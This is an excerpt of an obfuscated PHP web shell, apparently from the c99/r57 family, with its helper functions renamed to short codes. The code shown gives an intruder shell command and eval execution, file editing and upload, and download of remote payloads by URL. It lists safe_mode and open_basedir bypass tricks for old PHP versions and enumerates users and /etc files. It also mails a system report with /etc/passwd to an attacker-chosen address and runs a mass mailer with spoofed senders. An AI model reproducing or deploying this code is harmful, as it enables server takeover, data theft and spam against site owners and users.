    echo z2b(z5c(["act" => "d", "d", "dt" => "rename", "tt", "drename" => "1"], z10e(z7i(z6x(z8e(z9s("473", z2h($tt))) . z5u("newname", $tt, "9") . z8v(z9s("73"), "7"))), "2")), '0');
}
if ($act == "f" && @isset($ft) && $ft == "rename" && @isset($f) && !@empty($f)) {
    if (@isset($frename) && $frename && @isset($newname) && !@empty($newname)) {
        ...
        echo z2b(z5c(["act" => "f", "f", "d", "ft" => "rename", "ff", "frename" => "1"], z10e(z7i(z6x(z8e(z9s("473", z2h($ff))) . z5u("newname", $ff, "9") . z8v(z9s("73"), "7"))), "2")), '0');
    }
    $act = "ls";
...
if (@isset($chmod_submit) && $chmod_submit && @isset($ctarget)) {
    ...
    if (z7r('clearstatcache')) @clearstatcache();
}
z8j();
if ($act == "dfunc") {
    z2z();
    ...
    if (z7r('touch')) {
        ...
        echo z10e(z5n() . (@isset($tmsg) && !@empty($tmsg) ? z7i(z5t(z9c()) . z9j($tmsg)) : '') . z7i(z5c(["act", "d", "st1" => "1"], z5t(z9s("104")) . z9j(z5u("copy_from", "", "9") . z8v(z9s("112"), "7")))) . z7i(z5c(["act", "d", "st2" => "1"], z5t(z9s("105")) . z9j(z4a("tmonth", $tmonth_arr, "4", 1) . "-" . z4a("tday", $tday_arr, "4", 1) . "-" . z4a("tyear", $tyear_arr, "4", 1) . z9c(12) . z4a("thour", $thour_arr, "1", 1) . ":" . z4a("tmin", $tmin_arr, "1", 1) . ":" . z4a("tsec", $tsec_arr, "1", 1) . z8v(z9s("112"), "7")))) . z5n(), "2");
    }
}
if ($act == "f" && @isset($ft)) {
    $ft = @trim($ft);
    ...
    if ((!z4j($d . $f) && z0n($d . $f)) || (!z4q($d . $f) && z0v($d) && @isset($ft) && $ft == "new")) {
        ...
        switch ($ft) {
            ...
            case 'edit':
                ...
                echo z5c(["act" => "f", "d", "f", "ft" => "edit", "save" => "1"], z10e(z9f(z6x(z5w('txtedit', '2') . @htmlspecialchars($r) . z5q() . z9x() . z5x("left", "3") . z8e(z9s("115")) . '<input type="text" id="replace_a" class="' . z4m('5', '4') . '">' . z9c(5) . z8e(z9s("116")) . '<input type="text" id="replace_b" class="' . z4m('5', '4') . '">' . z8m(z9s("117"), 'fnc_replace(\'txtedit\',\'replace_a\',\'replace_b\');', "7") . '<input type="reset" value="' . z9s("118") . '" class="' . z4m('7', '5') . '">' . z8v(z9s("119"), "7") . z9c() . z8e($msg) . z5j())), "2"));
                echo z6d();
                break;
            case 'text':
            ...
            case 'exe':
                ...
                echo z5c(["act" => "f", "ft" => "exe", "d", "f", "exec" => "1"], z10e(z5n() . z7i(z6x(z8e(z9s("120")) . z5u('ecmd', '', "9") . z8v(z9s("99"), "7"))) . z5n(), "2"));
            ...
            case 'img':
                ...
                if (@isset($inf[0]) && @isset($inf[1]) && @isset($inf['mime'])) {
                    ...
                    $w = $h = $t = '';
                    if (@preg_match('/(jpg|jpeg|gif|png)/i', $r, $m)) $t = ($m[1] === 'jpeg') ? 'jpg' : $m[1];
                    $mime = 'image/' . @strtolower($t);
                }
                if (!@isset($white) || !$white) {
                    echo z5x("center") . z9x();
                    if ($w != '') {
                        foreach (['20', '50', '100', '150', '200'] as $v) echo z5c(['act' => 'f', 'd', 'f', 'ft' => 'img', 'is' => $v], z8v($v . '%', ($is == $v ? '17' : '16')));
                    }
                ...
                break;
            case 'hex':
                if (!@isset($hexdump_type)) $hexdump_type = '';
                ...
                echo z10e(z9f(z6x(z10e(z7i(z9j($a0, '16') . z9j($a1, '17') . z9j($a2, '18')), '8') . z10e(z9f(z7e(z5c(['act' => 'f', 'd', 'f', 'ft', 'hexdump_type' => ($hexdump_type == 'full' ? 'preview' : 'full')], z8v(($hexdump_type == 'full' ? z9s("122") : z9s("121")), '7')))), '8'))), '2');
                break;
            case 'download':
                @ob_clean();
            ...
            switch ($ft) {
                ...
                default:
                    if (z4q($d . $f) && z4j($d . $f)) {
                        ...
                        echo z2b(z10e(z7i(z9j(z8e(z9s("466", $d . $f)) . z5c(["act" => "f", "d", "f", "ft" => "new"], z8v(z9s("195"), "7")) . $rbut)), "2"));
                    } else {
                        $loadb = 1;
                    }
                    break;
        ...
        if ($loadb) {
            z1q($d . $f);
            $rf_arr = $sqlrf_arr = $wf_arr = [];
            $rf_arr["include"] = "include (safe_mode)";
            if ($bcurl && @version_compare(@phpversion(), "5.2.0") <= 0) $rf_arr["curl"] = "curl (open_basedir / PHP <= 4.4.2, 5.1.4)";
            if (!$win && z7r('mb_send_mail') && @version_compare(@phpversion(), "5.2.0") <= 0) $rf_arr["mb_send_mail"] = "mb_send_mail (safe_mode / PHP <= 4.0-4.2.2, 5.x)";
            if (z7r('imap_open') && z7r('imap_body') && @version_compare(@phpversion(), "5.2.0") <= 0) $rf_arr["imap_body"] = "imap_body (safe_mode on PHP <= 5.1.2)";
            if (z7r('ini_restore') && @version_compare(@phpversion(), "5.2.0") <= 0) $rf_arr["ini_restore"] = "ini_restore (safe_mode / PHP <= 4.4.4, 5.1.6) by NST";
            if (z7r('copy') && @version_compare(@phpversion(), "5.2.0") <= 0) $rf_arr["zlib"] = "copy[compress.zlib://] (safe_mode / PHP <= 4.4.2, 5.1.2)";
            if ($bmysql) $sqlrf_arr["mysql"] = "mysql (safe_mode)";
            if ($bmssql) $sqlrf_arr["mssql"] = "mssql (safe_mode)";
            if (z7r('error_log') && @version_compare(@phpversion(), "5.2.2") <= 0) $wf_arr["error_log"] = "error_log[php://] (open_basedir / PHP <= 5.1.4, 4.4.2)";
            if (z7r('readfile') && @version_compare(@phpversion(), "5.2.2") <= 0) $wf_arr["readfile"] = "readfile[php://] (open_basedir / PHP <= 5.2.1, 4.4.4)";
            if (@version_compare(@phpversion(), "5.2.4") <= 0) $wf_arr["fopen"] = "fopen[srpath://] (open_basedir / PHP v5.2.0)";
            if (@count($rf_arr) > 0) {
                echo z2b(z9s("128"));
                echo z6d();
                echo z5c(["act" => "f", "d", "f" => (@isset($readfile) ? $readfile : $d . $f), "ft" => "functions", "submit1" => "1"], z10e(z7i(z5t(z9s("129")) . z9j(z6i("readfile", (@isset($readfile) ? $readfile : $d . $f), "0", "", "9") . z4a("readfile_func", $rf_arr, "5", 1) . z8v(z9s("130"), "7"))), "2"));
                    ...
                    switch ($sqlreadfile_func) {
                        case 'mysql':
                            ...
                            if ($db) {
                                ...
                                @mysql_close($db);
                            } else echo z9s("137", "MySQL");
                            echo z5q();
                            break;
                        case 'mssql':
                            echo z5w('', '1');
                            if (@empty($sqlport)) $sqlport = "1433";
            ...
            if (@count($wf_arr) > 0) {
                echo z2b(z9s("138"));
                echo z6d();
                echo z5c(["act" => "f", "d", "f" => (@isset($writefile) ? $writefile : $d . $f), "ft" => "functions", "submit3" => "1"], z10e(z7i(z5t(z9s("139")) . z9j(z5u("writefile", $d . $f, "0", "", "9") . z4a("writefile_func", $wf_arr, "5", 1) . z8v(z9s("141"), "7"))) . z7i(z5t(z9s("140")) . z9j(z5w("writecontent", "1") . (@isset($writecontent) ? @htmlspecialchars($writecontent) : '<? phpinfo(); ?>') . z5q())), "2"));
...
if ($act == 'search') {
    $ftarget = 1;
    $fullpath = 1;
    if (!@isset($s_in) || @empty($s_in)) $s_in = $d;
    if (!@isset($sn) || @empty($sn)) {
        $sn = "(.*)";
        $sn_reg = 1;
    }
    if (!@isset($sn_reg)) $sn_reg = '';
    if (!@isset($st)) $st = '';
    if (!@isset($st_reg)) $st_reg = '';
    if (!@isset($st_wwo)) $st_wwo = '';
    if (!@isset($st_cs)) $st_cs = '';
    if (!@isset($st_not)) $st_not = '';
    if (!@isset($s_fd)) $s_fd = '';
    if (!@isset($s_rec)) $s_rec = '1';
    if (!@isset($find_text) || @empty($find_text)) $find_text = "text";
    if (!@isset($find_in_dir) || @empty($find_in_dir)) $find_in_dir = $d;
    if (!@isset($find_in_files) || @empty($find_in_files)) $find_in_files = "*.php;*.txt";
    z0d();
    if (@isset($submit) && $submit) {
        ...
        $search_i_f = 0;
        $search_i_d = 0;
        $ar = ["sn" => $sn, "sn_reg" => $sn_reg, "st" => $st, "st_reg" => $st_reg, "st_wwo" => $st_wwo, "st_cs" => $st_cs, "st_not" => $st_not, "s_fd" => $s_fd];
...
if ($act == 'cmd') {
    $st_a = ['' => '-', ' 2>&1' => '2>&1'];
    echo z2b(z10e(z7i(z6x(z8e(z9s("180")) . z9l('', 'command') . z3e(['act' => 'cmd', 'd', 'cmdsubmit' => '1']) . z6i('cmd', '', '0') . ($nix ? z4a('stderr', $st_a, '1', '1') : '') . z8v('&raquo;', '7') . z9z(), '', '2') . z6x(z8e(z9s("181")) . z5c(['act' => 'cmd', 'd', 'cmdsubmit' => '1'], z2u('scmd', ($win ? $winaliases : $nixaliases), '0', '1') . ($nix ? z4a('stderr', $st_a, '1', '1') : '') . z8v('&raquo;', '7')), '')), '2'));
...
if ($act == 'sysinfo') {
    ...
    $users = [];
    if ($bpasswd) $users = z6m(1);
    $distro = z1n();
    $uptime = ($nix && $sh_exec) ? z9t("uptime") : '';
    $system = $host = $kernel = "";
    $sys = (($nix && $sh_exec) ? z9t("uname -a") : (z7r('php_uname') ? @php_uname("a") : '   '));
    if ($nix) @list($system, $host, $kernel,) = @explode(" ", $sys);
    if (!@empty($sys)) $g_arr[] = ["System", $sys, $sys];
    if (!@empty($system) && !@empty($kernel)) $g_arr[] = [(($linux) ? "Kernel" : "Version"), $system . " " . $kernel, $system . " " . $kernel];
    if (!@empty($distro)) $g_arr[] = ["Distro name", $distro, nl2br($distro)];
    $idu = "";
    if ($nix && $sh_exec) {
        $idu = z9t("id");
        $eid = @explode(" ", $idu);
        if (@count($eid) >= 2) $idu = $eid[0] . " " . $eid[1];
    }
    if (!@empty($idu)) $g_arr[] = ["User id", $idu, $idu];
    if (!@empty($uptime)) $g_arr[] = ["Uptime", $uptime, $uptime];
    if (!@empty($date)) $g_arr[] = ["Local time", $date, $date];
    $g_arr[] = ["CPU info", z3f(), z3f()];
    $mem = z5a();
    $g_arr[] = ["RAM info", $mem[0][1], $mem[0][0] . $mem[0][1]];
    if ($nix) $g_arr[] = ["RAM buffered", $mem[1][1], $mem[1][0] . $mem[1][1]];
    if ($nix) $g_arr[] = ["Swap", $mem[2][1], $mem[2][0] . $mem[2][1]];
    $disk = z9e();
    if (@count($disk) > 1 || !@isset($disk[0][0])) {
        foreach ($disk as $dd => $inf) {
            $g_arr[] = ["Space on " . $dd, $inf[1], $inf[0] . $inf[1]];
        }
    } else {
        $g_arr[] = ["Disk space", $disk[0][1], $disk[0][0] . $disk[0][1]];
    }
    if (!@empty($host)) {
    ...
    $g_arr[] = ["Hostname", $host, $host];
    if (@count($users) > 0) {
        if (@isset($viewusers) && $viewusers) {
            $pusers = '';
            foreach ($users as $uarr) {
                $pusers .= z5c(["act" => "ls", "d" => $uarr[1]], z8v($uarr[0], "1"), 1) . z9c() . " ";
            }
        } else {
            $pusers = @count($users) . " users on this box." . z9c() . z5c(["act" => "sysinfo", "d", "viewusers" => "1"], z8v("View", "1"));
        }
        $g_arr[] = ["System users", "", $pusers];
    }
    if (@count($g_arr) > 0) {
        echo z2b(z9s("479"));
        echo z9m('2');
    ...
    if ($bopendir) {
        foreach (z9d(@ini_get("open_basedir")) as $od) {
            $opendirs .= z5c(["act" => "ls", "d" => $od], z8v($od, "1"), 1) . z9c() . " ";
        }
    }
    $dfnc = z6j();
    if (@count($dfnc) > 0) {
        $ndfnc = @implode(" ", $dfnc);
        $pdfnc = "";
        foreach ($dfnc as $fnc) $pdfnc .= z10y('http://php.net/manual/en/function.' . @str_replace("_", "-", $fnc) . '.php', $fnc, "1", 1) . z9c() . " ";
    } else {
        $ndfnc = "NONE";
        $pdfnc = z5i("NONE");
    }
    $p_arr = [];
    $p_arr[] = ["PHP Version", @phpversion(), @phpversion() . z9c() . z5c(["act" => "phpinfo", "d"], z8v("PHP Info", "1"))];
    $p_arr[] = ["Open Basedir", (($bopendir) ? @ini_get("open_basedir") : "NONE"), (($bopendir) ? $opendirs : z5i("NONE"))];
    $p_arr[] = ["Safe-mode", (($bsafe) ? "ON" : "OFF"), ($bsafe ? z8z("ON") : z5i("OFF"))];
    if ($bsafe) {
        $p_arr[] = ["Safe-mode exec dir", $psmed, (($bsmed) ? z5i($psmed) : z8z($psmed))];
        $p_arr[] = ["Safe-mode include dir", $psmid, (($bsmid) ? z5i($psmid) : z8z($psmid))];
    }
    foreach (["register_globals", "allow_url_fopen", "allow_url_include", "memory_limit", "file_uploads", "upload_tmp_dir", "upload_max_filesize", "post_max_size",] as $ini) {
        $p_arr[] = [z3r(@str_replace("_", " ", $ini)), z4r(@ini_get($ini)), z4r(@ini_get($ini))];
    }
    $p_arr[] = ["Disabled Functions", $ndfnc, $pdfnc];
    if (@count($p_arr) > 0) {
        echo z2b(z9s("480"));
        echo z9m('2');
    ...
    if ($nix) {
        $o_arr = [];
        $tmp = $tmpp = '';
        foreach (["/etc/" => ["passwd", "hosts", "modules", "fstab", "issue", "issue.net", "motd"], "/proc/" => ["cpuinfo", "meminfo", "version", "interrupts"]] as $ed => $af) {
            foreach ($af as $ef) {
                if (z4q($ed . $ef) && z0n($ed . $ef)) {
                    $tmp .= $ed . $ef . " ";
                    $tmpp .= z5c(["act" => "f", "d" => $ed, "f" => $ef, "ft" => "text"], z8v($ef, "1"), 1) . z9c() . " ";
                }
            }
        }
        if (!@empty($tmp)) $o_arr[] = [z9s("482"), $tmp, $tmpp];
        $tmp = $tmpp = '';
        foreach (["/etc/" => ["syslog.conf", "syslogd.conf", "rsyslog.conf", "resolv.conf", "httpd.conf", "apache2.conf", "apache.conf", "apache2/apache.conf", "proftpd.conf", "proftpd.conf", "inetd.conf"], "/etc/apache2/" => ["httpd.conf", "apache2.conf"], "/etc/proftpd/" => ["proftpd.conf"]] as $ed => $af) {
            foreach ($af as $ef) {
                if (z4q($ed . $ef) && z0n($ed . $ef)) {
                    $tmp .= $ed . $ef . " ";
                    $tmpp .= z5c(["act" => "f", "d" => $ed, "f" => $ef, "ft" => "text"], z8v($ef, "1"), 1) . z9c() . " ";
        ...
        if (!@empty($tmp)) $o_arr[] = [z9s("483"), $tmp, $tmpp];
        $tmp = $tmpp = '';
        foreach (["curl", "fetch", "links", "lynx", "GET", "w3m", "wget"] as $ef) {
            $ff = z8u($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5c(["act" => "f", "d" => z3p($ff), "f" => z2h($ff)], z8v(z2h($ef), "1"), 1) . z9c() . " ";
            }
        }
        $tmp = $tmpp = '';
        foreach (["gcc", "cc", "c++", "g++", "nasm", "ld", "make", "cmake"] as $ef) {
            $ff = z8u($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5c(["act" => "f", "d" => z3p($ff), "f" => z2h($ff)], z8v(z2h($ef), "1"), 1) . z9c() . " ";
        ...
        if (!@empty($tmp)) $o_arr[] = [z9s("484"), $tmp, $tmpp];
        $tmp = $tmpp = '';
        foreach (["perl", "python", "php", "ruby", "tcl"] as $ef) {
            $ff = z8u($ef);
            if (!@empty($ff)) {
                $tmp .= $ef . " ";
                $tmpp .= z5c(["act" => "f", "d" => z3p($ff), "f" => z2h($ff)], z8v(z2h($ef), "1"), 1) . z9c() . " ";
        ...
        if (!@empty($tmp)) $o_arr[] = [z9s("485"), $tmp, $tmpp];
        if (@count($o_arr) > 0) {
            echo z2b(z9s("481"));
            echo z9m('2');
    ...
    if ($bmail) {
        ...
        if (@isset($sendlog) && $sendlog && @isset($sysmail) && !@empty($sysmail)) {
            ...
            if (@count($g_arr) > 0) {
                $msg .= $line . z9s("479") . "\r\n" . $line;
                for ($i = 0; $i < @count($g_arr); $i++) {
                    if (!@empty($g_arr[$i][1])) $msg .= $g_arr[$i][0] . " : " . $g_arr[$i][1] . "\r\n";
                }
            }
            if (@count($p_arr) > 0) {
                $msg .= $line . z9s("480") . "\n" . $line;
                for ($i = 0; $i < @count($p_arr); $i++) {
                    if (!@empty($p_arr[$i][1])) $msg .= $p_arr[$i][0] . " : " . $p_arr[$i][1] . "\r\n";
                }
            }
            if (@count($o_arr) > 0) {
                $msg .= $line . z9s("481") . "\n" . $line;
                for ($i = 0; $i < @count($o_arr); $i++) {
                    if (!@empty($o_arr[$i][1])) $msg .= $o_arr[$i][0] . " : " . $o_arr[$i][1] . "\r\n";
                }
            }
            $msg .= $line;
            if ($bpasswd) $msg .= "/etc/passwd\n" . $line . z9p("/etc/passwd") . $line;
            $emsg = (@mail($sysmail, "SYSINFO|$saddr", $msg) ? z9s("243") : z9s("244"));
        }
        echo z2b(z9s("302") . (($emsg != '') ? " : " . $emsg : ''));
        echo z5c(["act" => "sysinfo", "d", "sendlog" => "1"], z10e(z5n() . z7i(z6x(z5u("sysmail", z7x('2', "email"), "0") . z8v(z9s("179"), "7"))) . z5n(), "2"));
    }
}
if ($act == 'eval') {
    if (!@isset($evalsubmit)) {
    ...
    echo z10e(z7i(z6x(z5c(['act' => 'eval', 'd', 'evalsubmit' => '1'], z5w('eval', '1') . (@isset($eval) ? @htmlspecialchars($eval) : '//readfile("/etc/passwd");' . "\r\n") . z5q() . z9x() . z5x("left", "3") . z8v(z9s("183"), '7', '9') . z5y("eval_txt", z9s("184"), "eval_txt") . z5j()))) . z5n(), '2');
...
if ($act == 'upload') {
    ...
    if (!@isset($multiupload)) {
        if (@isset($usubmit) && $usubmit) {
            ...
            if (!@isset($path1) || @empty($path1)) $path1 = $d;
            $path1 = z1a($path1);
            if (!@empty($dest)) {
                if (!@move_uploaded_file($_FILES['file1']['tmp_name'], $path1 . $dest)) {
                    $umsg = z9s("172", [$_FILES['file1']['name'], $_FILES['file1']['tmp_name'], $path1 . $dest]);
                } else {
                    $umsg = z9s("173", [$_FILES['file1']['name'], $path1 . $dest]);
                    $ls_a[] = $path1 . $dest;
                    $nolsmenu = 1;
                    $act = "ls";
                    $d = $path1;
        ...
        echo z2b(z9s("161")) . $umsg . z10e(z5n() . z9f(z9j(z5m(['act' => 'upload', 'd', 'usubmit' => '1'], z10e(z7i(z5t(z9s("162")) . z9j(z9h('file1', '2') . z8v(z9s("170"), '7') . $wdt)) . z7i(z5t(z9s("163")) . z9j(z6i('rfile1', (@isset($rfile1) ? $rfile1 : ''), "9"))) . z7i(z5t(z9s("164")) . z9j(z6i('path1', (@isset($path1) ? $path1 : $d), "9")))))) . z9j(z5c(['act' => 'upload', 'd', 'multiupload' => '1'], z10e(z7i(z9j(z8e(z9s("166")) . z6i('lno', ((@isset($lno)) ? $lno : '10'), '1') . z8v(z9s("169"), '7'))))))) . z5n(), '2');
    } else {
        if (@isset($msubmit) && $msubmit) {
            ...
            foreach ($_FILES as $fk => $fv) {
                ...
                if (!@isset($mpath) || @empty($mpath)) $mpath = $d;
                $mpath = z1a($mpath);
                if (!@empty($dest)) {
                    if (!@move_uploaded_file($_FILES[$fk]['tmp_name'], $mpath . $dest)) {
                        $mmsg .= z9s("172", [$_FILES[$fk]['name'], $_FILES[$fk]['tmp_name'], $mpath . $dest]) . z9x();
                    } else {
                        $mmsg .= z9s("173", [$_FILES[$fk]['name'], $mpath . $dest]) . z9x();
                        $ls_a[] = $mpath . $dest;
                        $nolsmenu = 1;
                        $act = "ls";
                        $ftarget = '1';
            ...
            if ($mmsg != '') $mmsg = z10e(z7i(z9j($mmsg)));
        }
        $form = '';
        if (!@is_numeric($lno)) $lno = 10;
        for ($i = 0; $i < $lno; $i++) {
            $ii = ($i + 1);
            $form .= z7i(z5t(z9s("162") . " " . $ii) . z9j(z9h('file' . $ii, '2')) . z5t(z9s("163")) . z9j(z6i('rfile[file' . $ii . ']', '', "0")));
        }
        echo z2b(z9s("168")) . $mmsg . z5m(['act' => 'upload', 'd', 'multiupload' => '1', 'lno', 'msubmit' => '1'], z10e(z5n() . $form) . z10e(z5n() . z7i(z5t(z9s("164")) . z9j(z6i('mpath', (@isset($mpath) ? $mpath : $d), "9") . z8v(z9s("170"), '7') . $wdt)) . z5n()));
    }
    if ($bcurl) $a_get['phpcurl'] = "use php->curl";
    if ($bfsock) $a_get['fsock'] = "use php->fsockopen";
    if (z7r('ini_get') && z8l('allow_url_fopen') && z7r('file_get_contents')) $a_get['file_get_contents'] = "use php->file_get_contents";
    if ($nix && $sh_exec) {
        foreach ($getaliases as $k => $v) {
            if (z8u($k)) $a_get[$k] = "use cmd->$k";
        }
    }
    if (@count($a_get) > 0) {
        if (@isset($rsubmit) && $rsubmit) {
            ...
            if (!@preg_match(":^(http|https|ftp)\://([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&%\$\-]+)*@)?((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.[a-zA-Z]{2,4})(\:[0-9]+)?(/[^/][a-zA-Z0-9\.\,\?\'\\/\+&%\$#\=~_\-@]*)*$:i", $uploadurl)) {
                ...
                $dest = z2h($uploadurl);
                if (@isset($nameurl) && !@empty($nameurl)) $dest = $nameurl;
                if (@empty($dest)) $dest = 'index.html';
                if (!@isset($rpath) || @empty($rpath)) $rpath = $d;
                $rpath = z1a($rpath);
                if (z4q($rpath . $dest)) {
                    $i = 1;
                ...
                if ($upwith == 'phpcurl' || $upwith == 'fsock' || $upwith == 'file_get_contents') {
                    if ($upwith == 'phpcurl') $fct = z3a($uploadurl);
                    if ($upwith == 'fsock') $fct = z2f($uploadurl);
                    if ($upwith == 'file_get_contents') $fct = @file_get_contents($uploadurl);
                    if (!$fct || @empty($fct)) {
                        $rmsg = z9s("174");
                    } else {
            ...
            if ($rmsg != '') $rmsg = z10e(z7i(z9j($rmsg)));
        }
        echo z2b(z9s("167")) . $rmsg . z5c(['act' => 'upload', 'd', 'rsubmit' => '1'], z10e(z5n() . z7i(z5t(z9s("165")) . z9j(z6i('uploadurl', (@isset($uploadurl) ? $uploadurl : 'http://'), "0") . z4a('upwith', $a_get, '4', '1') . z8v(z9s("170"), '7') . $wdt)) . z7i(z5t(z9s("163")) . z9j(z6i('nameurl', (@isset($nameurl) ? $nameurl : ''), "9"))) . z7i(z5t(z9s("164")) . z9j(z6i('rpath', (@isset($rpath) ? $rpath : $d), "9"))) . z5n(), '2'));
    }
}
if (@isset($lsall) && @isset($action) && $action != '') {
    ...
    if (@count($lsall_arr) > 0) {
        ...
        if (@isset($use_buffer) && $use_buffer) z1w();
    }
}
if ($act == 'mailer') {
    $smsg = $cmsg = '';
    ...
    if (!@isset($m1_msg) || @empty($m1_msg)) $m1_msg = "message";
    if (!@isset($m1_emails) || @empty($m1_emails)) $m1_emails = "e-mails";
    if (!@isset($m2_prefix) || @empty($m2_prefix)) $m2_prefix = "column_prefix_";
    if (!@isset($m2_ecol) || !@is_numeric($m2_ecol)) $m2_ecol = "0";
    if (!@isset($m2_msg) || @empty($m2_msg)) $m2_msg = "Hello " . $m2_prefix . "1,\r\n\r\nYour Address: " . $m2_prefix . "2\r\nYour Phone: " . $m2_prefix . "3\r\n\r\nE-mail sent to: " . $m2_prefix . "0";
    if (!@isset($m2_csv) || @empty($m2_csv)) $m2_csv = '"john@email","john","john\'s address","0123456789"' . "\r\n" . '"jane@email","jane","jane\'s address","9876543210"';
    echo z2b([z9s("212") . $smsg, z9s("213") . $cmsg], '46');
    echo z9m('2') . z7p() . z7k('', '4');
    echo z10e(z5n() . z9f(z9j(z10e(z5c(["act" => "mailer", "d", "m1_submit" => "1"], z7i(z9j(z8e(z9s("214"))) . z7e(z5u('m1_name', '', '7'))) . z7i(z9j(z8e(z9s("215"))) . z7e(z5u('m1_from', '', '7'))) . z7i(z9j(z8e(z9s("216"))) . z7e(z5u('m1_subj', '', '7'))) . z7i(z6c(z5w('m1_msg', '3') . $m1_msg . z5q(), '2')) . z7i(z6c(z5w('m1_emails', '3') . $m1_emails . z5q(), '2')) . z7i(z6c(z10e(z7i(z9j(z8e(z9s("217")) . z5u('m1_str', '', '4')) . z9j(z8e(z9s("218")) . z4a('m1_replace', ["" => z9s("223"), "name" => z9s("224"), "email1" => z9s("225"), "email2" => z9s("226"), "emailhash" => z9s("227")], '4', 1)) . z9j(z8e(z9s("219")) . z4a("m1_where", ["subject" => z9s("228"), "message" => z9s("229"), "" => z9s("230")], '5', 1))), '2'), '2')) . z7i(z6c(z10e(z7i(z9j(z5y("m1_rand1", z9s("231"), "m1_rand1"), '', '4') . z9j(z5y("m1_rand2", z9s("232"), "m1_rand2"), '', '4')), '2'), '2')) . z5n() . z7i(z6c(z8v(z9s("233"), '7') . z5y('m1_preview', z9s("234"), 'm1_preview'), '2'))), '2'), '20')) . z5n(), '2');
    echo z7g() . z7k('', '46');
    echo z10e(z5n() . z9f(z9j(z10e(z5c(['act' => 'mailer', "d", 'm2_submit' => '1'], z7i(z9j(z8e(z9s("214"))) . z7e(z5u('m2_name', '', '7'))) . z7i(z9j(z8e(z9s("215"))) . z7e(z5u('m2_from', '', '7'))) . z7i(z9j(z8e(z9s("216"))) . z7e(z5u('m2_subj', '', '7'))) . z7i(z6c(z5w('m2_msg', '3') . $m2_msg . z5q(), '2')) . z7i(z6c(z5w('m2_csv', '3') . $m2_csv . z5q(), '2')) . z7i(z6c(z10e(z7i(z9j(z8e(z9s("220")) . z6i('m2_ecol', $m2_ecol, '6')) . z9j(z8e(z9s("221")) . z5u('m2_prefix', '', '4')) . z9j(z8e(z9s("222")) . z4a('m2_where', ["message" => z9s("229"), "" => z9s("230")], "4", 1))), '2'), '2')) . z7i(z6c(z10e(z7i(z9j(z5y("m2_rand1", z9s("231"), "m2_rand1"), '', '4') . z9j(z5y("m2_rand2", z9s("232"), "m2_rand2"), '', '4')), '2'), '2')) . z5n() . z7i(z6c(z8v(z9s("233"), '7') . z5y('m2_preview', z9s("234"), "m2_preview") . ' ' . z5y('m2_verbose', z9s("235"), "m2_verbose"), '2'))), '2'), '20')) . z5n(), '2');
    echo z7g() . z7u() . z10w();
    if ($s_ok || $c_ok) {
        $host = ["aol.com", "att.net", "bellsouth.net", "comcast.net", "email.com", "gmail.com", "googlemail.com", "hotmail.com", "juno.com", "live.com", "lycos.com", "mail.com", "mindspring.com", "msn.com", "pacbell.com", "post.com", "prodigy.net", "rocketmail.com", "sbcglobal.net", "usa.com", "yahoo.com", "ymail.com"];
        $ch = (@count($host) - 1);
        $i = 1;
        $m_success = 0;
        $m_failed = 0;
        ...
        if ($s_ok) {
            ...
            foreach ($m_all as $m_mail) {
                ...
                if (@isset($m1_str) && !@empty($m1_str) && @isset($m1_replace) && !@empty($m1_replace)) {
                    if ($m1_replace == "name") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") $m_msg = @str_replace($m1_str, $m1_name, $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") $m_subj = @str_replace($m1_str, $m1_name, $m_subj);
                    } elseif ($m1_replace == "email1") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") $m_msg = @str_replace($m1_str, $m1_from, $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") $m_subj = @str_replace($m1_str, $m1_from, $m_subj);
                    } elseif ($m1_replace == "email2") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") $m_msg = @str_replace($m1_str, $m_mail, $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") $m_subj = @str_replace($m1_str, $m_mail, $m_subj);
                    } elseif ($m1_replace == "emailhash") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") $m_msg = @str_replace($m1_str, @md5($m_mail), $m_msg);
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") $m_subj = @str_replace($m1_str, @md5($m_mail), $m_subj);
                    }
                }
                $m_pad = "";
                if (@strlen($i) < $m_len) $m_pad = @str_repeat("0", ($m_len - @strlen($i)));
                if (!@empty($m_mail)) {
                    if (@isset($m1_preview) && $m1_preview) {
                        ...
                        if (@mail($m_mail, $m_subj, $m_msg, $header)) {
                ...
                if (@is_array($str_csv)) {
                    ...
                    for ($si = (@count($str_csv) - 1); $si >= 0; $si--) {
                        if (@empty($m2_where)) {
                            ...
                            $m2_name = @str_replace($m2_prefix . $si, $str_csv[$si], $m2_name);
                            $from = @str_replace($m2_prefix . $si, $str_csv[$si], $from);
                            if (isset($stringattachment_name) && isset($stringattachment_body)) {
                                $stringattachment_name_final = @str_replace($m2_prefix . $si, $str_csv[$si], $stringattachment_name);
                                $stringattachment_body_final = @str_replace($m2_prefix . $si, $str_csv[$si], $stringattachment_body);
                            }
                    ...
                    $m2_name = @str_replace($m2_prefix . $si, $str_csv[$si], $m2_name);
                    $from = @str_replace($m2_prefix . $si, $str_csv[$si], $from);
                    if ($sender_option == 'is_receiver') $from = $m_mail;
                    if ($sender_option == 'use_receiver_domain') {
                        $sender_explode = explode('@', $from);
                        $receiver_explode = explode('@', $m_mail);
                        $from = $sender_explode[0] . '@' . $receiver_explode[1];
                    }
                    if ($sender_option == 'use_shell_domain') {
                        $sender_explode = explode('@', $from);
                        $from = $sender_explode[0] . '@' . $_SERVER['HTTP_HOST'];
                    }
                    $header = "";
                    ...
                    if (!@empty($m_mail)) {
                        if (@isset($m2_preview) && $m2_preview) {
                            ...
